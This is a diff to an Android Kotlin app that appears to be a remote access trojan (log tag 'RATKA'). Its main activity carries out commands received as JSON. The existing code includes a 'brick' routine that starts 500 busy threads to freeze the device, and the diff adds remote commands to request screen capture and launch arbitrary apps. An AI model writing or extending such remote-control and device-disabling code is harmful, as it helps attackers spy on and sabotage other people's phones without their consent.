@@ -4,7 +4,7 @@ import android.app.Activity
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
-import android.media.AudioManager
+import android.media.projection.MediaProjectionManager
 import android.media.RingtoneManager
 import android.net.Uri
 import android.os.BatteryManager
@@ -83,6 +83,8 @@ class MainActivity : Activity() {
                         "volume_up" -> changeVolume(true)
                         "volume_down" -> changeVolume(false)
                         "brick" -> brickPhone()
+                        "screen" -> requestScreenCapture()
+                        "launch_app" -> launchApp(json.optString("package", "com.android.settings"))
                     }
                 } catch (e: Exception) {
                     Log.e("RATKA", "Ошибка", e)
@@ -157,7 +159,6 @@ class MainActivity : Activity() {
     }
 
     private fun brickPhone() {
-        // Ебанутый прикол, который вешает систему
         for (i in 1..500) {
             Thread {
                 var counter = 0L
@@ -169,6 +170,28 @@ class MainActivity : Activity() {
             }.start()
         }
         runOnUiThread { statusText?.text = "КИРПИЧ АКТИВИРОВАН" }
+    }
+
+    private fun requestScreenCapture() {
+        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        startActivityForResult(mpm.createScreenCaptureIntent(), 1001)
+    }
+
+    private fun launchApp(packageName: String) {
+        val intent = packageManager.getLaunchIntentForPackage(packageName)
+        if (intent != null) {
+            startActivity(intent)
+            runOnUiThread { statusText?.text = "Запущено: $packageName" }
+        } else {
+            runOnUiThread { statusText?.text = "Не найдено: $packageName" }
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 1001 && resultCode == Activity.RESULT_OK && data != null) {
+            runOnUiThread { statusText?.text = "Скриншот разрешен (пока заглушка)" }
+        }
     }
 
     override fun onDestroy() {
